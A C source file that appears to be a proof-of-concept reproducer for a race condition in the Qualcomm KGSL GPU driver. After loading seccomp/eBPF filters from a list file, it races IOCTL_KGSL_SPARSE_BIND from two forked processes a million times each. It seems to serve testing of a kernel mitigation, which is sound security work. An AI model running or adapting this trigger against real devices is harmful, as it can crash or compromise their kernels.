#include "kgsl.h"
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "libbpf.h"
#include "bpf_load.h"
#include <sys/prctl.h>
#include <linux/bpf.h>
#include <linux/seccomp.h>

#define SECCOMP_MODE_FILTER_EXTENDED 3

struct ebpf_filter {
    char path[256];
    int shared_map_ids[32];
};

int seccomp_set_filter(struct ebpf_filter *filter)
{
    if (load_bpf_file(filter->path, filter->shared_map_ids) != 0) {
        printf("Could not load seccomp/eBPF filter %s %s\n", filter->path, bpf_log_buf);
        return 1;
    }

    printf("filter %d %s fd: %d\n", prog_cnt, filter->path, prog_fd[prog_cnt-1]);

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER_EXTENDED, &(prog_fd[prog_cnt-1])) == -1) {
        printf("Could not install seccomp/eBPF filter, errno = %d\n", errno);
        return 1;
    }

    return 0;
}

int get_filter_list(struct ebpf_filter **filters) {
    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    int i = 0;

    fp = fopen("/data/seccomp/kgsl_filter_list", "r");
    if (fp == NULL) {
        printf("get_filter_list failed to open\n");
        return 0;
    }

    while ((read = getline(&line, &len, fp)) != -1) {
        char *token;
        char *end;
        filters[i] = (struct ebpf_filter *)malloc(sizeof(struct ebpf_filter));
        for (int j = 0; j < 32; j++)
            filters[i]->shared_map_ids[j] = -1;

        token = strtok(line, " ");
        if (token != NULL) {
            strncpy(filters[i]->path, token, 256);
        }
        token = strtok(NULL, " ");
        if (token != NULL) {
            int maps_cnt = strtol(token, &end, 10);
            for (int j = 0; j < maps_cnt; j++) {
                token = strtok(NULL, " ");
                if (token != NULL) {
                    filters[i]->shared_map_ids[j] = strtol(token, &end, 10);
                }
            }
        }

        printf("get_filter_list %s\n", filters[i]->path);
        i++;
    }

    fclose(fp);
    if (line)
        free(line);
    return i;
}

int main() {
    struct ebpf_filter *filters[32];
    int filters_cnt = get_filter_list(filters);
    for (int i = 0; i < filters_cnt; i++) {
        seccomp_set_filter(filters[i]);
    }

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd == -1) {
        err(1, "open");
    }

    int ret;

    struct kgsl_sparse_phys_alloc palloc_arg = {
        .size = 0x1000,
        .pagesize = 0x1000,
        .flags = 0,
    };

    ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_PHYS_ALLOC, &palloc_arg);
    printf("palloc %d %lx ret %d %d\n", palloc_arg.id, palloc_arg.flags, ret, errno);
    struct kgsl_sparse_virt_alloc valloc_arg = {
        .size = 0x1000,
        .pagesize = 0x1000,
        .flags = 0,
    };

    ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_VIRT_ALLOC, &valloc_arg);
    printf("valloc %d ret %d %d\n", valloc_arg.id, ret, errno);

    int pid = fork();
    if (pid) {
        for (int i = 0; i < 1000000; i++) {
            struct kgsl_sparse_binding_object bind_obj = {
                .virtoffset = 0,
                .physoffset = 0,
                .size = 0x1000,
                .flags = KGSL_SPARSE_BIND,
                .id = palloc_arg.id,
            };
            struct kgsl_sparse_bind bind_arg = {
                .list = (uintptr_t)&bind_obj, 
                .id = valloc_arg.id,
                .size = sizeof(struct kgsl_sparse_binding_object),
                .count = 1,
            };
            ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, &bind_arg);
            printf("p1 bind ret %d %d\n", ret, errno);
        }
    } else {
        for (int i = 0; i < 1000000; i++) {
            struct kgsl_sparse_binding_object bind_obj = {
                .virtoffset = 0,
                .physoffset = 0,
                .size = 0x1000,
                .flags = KGSL_SPARSE_BIND,
                .id = palloc_arg.id,
            };
            struct kgsl_sparse_bind bind_arg = {
                .list = (uintptr_t)&bind_obj, 
                .id = valloc_arg.id,
                .size = sizeof(struct kgsl_sparse_binding_object),
                .count = 1,
            };
            ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, &bind_arg);
            printf("p2 bind ret %d %d\n", ret, errno);
        }

    }
    printf("finish\n");
    close(kgsl_fd);

    return 0;
}
